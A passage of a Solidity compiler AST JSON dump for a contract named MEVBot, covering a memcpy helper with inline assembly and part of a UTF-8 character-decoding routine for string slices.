																		}
																	},
																	"src": "5723:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 480,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "5722:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "5715:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 482,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5735:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "5715:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5703:33:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "5755:164:0",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "5769:41:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "src",
																				"nodeType": "YulIdentifier",
																				"src": "5794:3:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "5788:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5788:10:0"
																	},
																	{
																		"arguments": [
																			{
																				"name": "mask",
																				"nodeType": "YulIdentifier",
																				"src": "5804:4:0"
																			}
																		],
																		"functionName": {
																			"name": "not",
																			"nodeType": "YulIdentifier",
																			"src": "5800:3:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5800:9:0"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "5784:3:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "5784:26:0"
															},
															"variables": [
																{
																	"name": "srcpart",
																	"nodeType": "YulTypedName",
																	"src": "5773:7:0",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "5823:38:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dest",
																				"nodeType": "YulIdentifier",
																				"src": "5849:4:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "5843:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5843:11:0"
																	},
																	{
																		"name": "mask",
																		"nodeType": "YulIdentifier",
																		"src": "5856:4:0"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "5839:3:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "5839:22:0"
															},
															"variables": [
																{
																	"name": "destpart",
																	"nodeType": "YulTypedName",
																	"src": "5827:8:0",
																	"type": ""
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "dest",
																		"nodeType": "YulIdentifier",
																		"src": "5881:4:0"
																	},
																	{
																		"arguments": [
																			{
																				"name": "destpart",
																				"nodeType": "YulIdentifier",
																				"src": "5890:8:0"
																			},
																			{
																				"name": "srcpart",
																				"nodeType": "YulIdentifier",
																				"src": "5900:7:0"
																			}
																		],
																		"functionName": {
																			"name": "or",
																			"nodeType": "YulIdentifier",
																			"src": "5887:2:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "5887:21:0"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "5874:6:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "5874:35:0"
															},
															"nodeType": "YulExpressionStatement",
															"src": "5874:35:0"
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 449,
														"isOffset": false,
														"isSlot": false,
														"src": "5849:4:0",
														"valueSize": 1
													},
													{
														"declaration": 449,
														"isOffset": false,
														"isSlot": false,
														"src": "5881:4:0",
														"valueSize": 1
													},
													{
														"declaration": 475,
														"isOffset": false,
														"isSlot": false,
														"src": "5804:4:0",
														"valueSize": 1
													},
													{
														"declaration": 475,
														"isOffset": false,
														"isSlot": false,
														"src": "5856:4:0",
														"valueSize": 1
													},
													{
														"declaration": 451,
														"isOffset": false,
														"isSlot": false,
														"src": "5794:3:0",
														"valueSize": 1
													}
												],
												"id": 485,
												"nodeType": "InlineAssembly",
												"src": "5746:173:0"
											}
										]
									},
									"documentation": null,
									"id": 487,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "memcpy",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 454,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 449,
												"mutability": "mutable",
												"name": "dest",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 487,
												"src": "5406:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 448,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5406:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 451,
												"mutability": "mutable",
												"name": "src",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 487,
												"src": "5417:8:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 450,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5417:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 453,
												"mutability": "mutable",
												"name": "len",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 487,
												"src": "5427:8:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 452,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5427:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5405:31:0"
									},
									"returnParameters": {
										"id": 455,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5450:0:0"
									},
									"scope": 1583,
									"src": "5390:535:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 633,
										"nodeType": "Block",
										"src": "6193:1013:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 497,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 494,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 489,
															"src": "6207:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$40_memory_ptr",
																"typeString": "struct MEVBot.slice memory"
															}
														},
														"id": 495,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 37,
														"src": "6207:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 496,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6220:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "6207:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 501,
												"nodeType": "IfStatement",
												"src": "6203:53:0",
												"trueBody": {
													"id": 500,
													"nodeType": "Block",
													"src": "6223:33:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 498,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6244:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 493,
															"id": 499,
															"nodeType": "Return",
															"src": "6237:8:0"
														}
													]
												}
											},
											{
												"assignments": [
													503
												],
												"declarations": [
													{
														"constant": false,
														"id": 503,
														"mutability": "mutable",
														"name": "word",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 633,
														"src": "6266:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 502,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6266:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 504,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "6266:9:0"
											},
											{
												"assignments": [
													506
												],
												"declarations": [
													{
														"constant": false,
														"id": 506,
														"mutability": "mutable",
														"name": "length",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 633,
														"src": "6285:11:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 505,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6285:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 507,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "6285:11:0"
											},
											{
												"assignments": [
													509
												],
												"declarations": [
													{
														"constant": false,
														"id": 509,
														"mutability": "mutable",
														"name": "divisor",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 633,
														"src": "6306:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 508,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6306:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 513,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_rational_452312848583266388373324160190187140051835877600158453279131187530910662656_by_1",
														"typeString": "int_const 4523...(67 digits omitted)...2656"
													},
													"id": 512,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"hexValue": "32",
														"id": 510,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6321:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_2_by_1",
															"typeString": "int_const 2"
														},
														"value": "2"
													},
													"nodeType": "BinaryOperation",
													"operator": "**",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "323438",
														"id": 511,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6326:3:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_248_by_1",
															"typeString": "int_const 248"
														},
														"value": "248"
													},
													"src": "6321:8:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_452312848583266388373324160190187140051835877600158453279131187530910662656_by_1",
														"typeString": "int_const 4523...(67 digits omitted)...2656"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6306:23:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "6393:38:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "6395:34:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "self",
																						"nodeType": "YulIdentifier",
																						"src": "6418:4:0"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "6424:2:0",
																						"type": "",
																						"value": "32"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "6414:3:0"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "6414:13:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "6408:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "6408:20:0"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "6402:5:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "6402:27:0"
															},
															"variableNames": [
																{
																	"name": "word",
																	"nodeType": "YulIdentifier",
																	"src": "6395:4:0"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 489,
														"isOffset": false,
														"isSlot": false,
														"src": "6418:4:0",
														"valueSize": 1
													},
													{
														"declaration": 503,
														"isOffset": false,
														"isSlot": false,
														"src": "6395:4:0",
														"valueSize": 1
													}
												],
												"id": 514,
												"nodeType": "InlineAssembly",
												"src": "6384:47:0"
											},
											{
												"assignments": [
													516
												],
												"declarations": [
													{
														"constant": false,
														"id": 516,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 633,
														"src": "6440:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 515,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6440:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 520,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 519,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 517,
														"name": "word",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 503,
														"src": "6449:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 518,
														"name": "divisor",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 509,
														"src": "6456:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6449:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6440:23:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 523,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 521,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 516,
														"src": "6477:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30783830",
														"id": 522,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6481:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_128_by_1",
															"typeString": "int_const 128"
														},
														"value": "0x80"
													},
													"src": "6477:8:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 535,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 533,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 516,
															"src": "6552:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30784530",
															"id": 534,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6556:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_224_by_1",
																"typeString": "int_const 224"
															},
															"value": "0xE0"
														},
														"src": "6552:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 549,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 547,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 516,
																"src": "6634:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30784630",
																"id": 548,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6638:4:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_240_by_1",
																	"typeString": "int_const 240"
																},
																"value": "0xF0"
															},
															"src": "6634:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"id": 571,
															"nodeType": "Block",
															"src": "6713:63:0",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 565,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 561,
																			"name": "ret",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 492,
																			"src": "6727:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 564,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 562,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 516,
																				"src": "6733:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "&",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30783037",
																				"id": 563,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "6737:4:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_7_by_1",
																					"typeString": "int_const 7"
																				},
																				"value": "0x07"
																			},
																			"src": "6733:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "6727:14:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 566,
																	"nodeType": "ExpressionStatement",
																	"src": "6727:14:0"
																},
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 569,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 567,
																			"name": "length",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 506,
																			"src": "6755:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "34",
																			"id": 568,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6764:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_4_by_1",
																				"typeString": "int_const 4"
																			},
																			"value": "4"
																		},
																		"src": "6755:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 570,
																	"nodeType": "ExpressionStatement",
																	"src": "6755:10:0"
																}
															]
														},
														"id": 572,
														"nodeType": "IfStatement",
														"src": "6631:145:0",
														"trueBody": {
															"id": 560,
															"nodeType": "Block",
															"src": "6644:63:0",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 554,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 550,
																			"name": "ret",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 492,
																			"src": "6658:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 553,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 551,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 516,
																				"src": "6664:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "&",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30783046",
																				"id": 552,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "6668:4:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_15_by_1",
																					"typeString": "int_const 15"
																				},
																				"value": "0x0F"
																			},
																			"src": "6664:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "6658:14:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 555,
																	"nodeType": "ExpressionStatement",
																	"src": "6658:14:0"
																},
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 558,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 556,
																			"name": "length",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 506,
																			"src": "6686:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "33",
																			"id": 557,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6695:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_3_by_1",
																				"typeString": "int_const 3"
																			},
																			"value": "3"
																		},
																		"src": "6686:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 559,
																	"nodeType": "ExpressionStatement",
																	"src": "6686:10:0"
																}
															]
														}
													},
													"id": 573,
													"nodeType": "IfStatement",
													"src": "6549:227:0",
													"trueBody": {
														"id": 546,
														"nodeType": "Block",
														"src": "6562:63:0",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 540,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 536,
																		"name": "ret",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 492,
																		"src": "6576:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 539,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 537,
																			"name": "b",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 516,
																			"src": "6582:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "30783146",
																			"id": 538,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6586:4:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_31_by_1",
																				"typeString": "int_const 31"
																			},
																			"value": "0x1F"
																		},
																		"src": "6582:8:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "6576:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 541,
																"nodeType": "ExpressionStatement",
																"src": "6576:14:0"
															},
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 544,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 542,
																		"name": "length",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 506,
																		"src": "6604:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 543,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "6613:1:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "6604:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 545,
																"nodeType": "ExpressionStatement",
																"src": "6604:10:0"
															}
														]
													}
												},
												"id": 574,
												"nodeType": "IfStatement",
												"src": "6473:303:0",
												"trueBody": {
													"id": 532,
													"nodeType": "Block",
													"src": "6487:56:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 526,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 524,
																	"name": "ret",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 492,
																	"src": "6501:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"id": 525,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 516,
																	"src": "6507:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "6501:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 527,
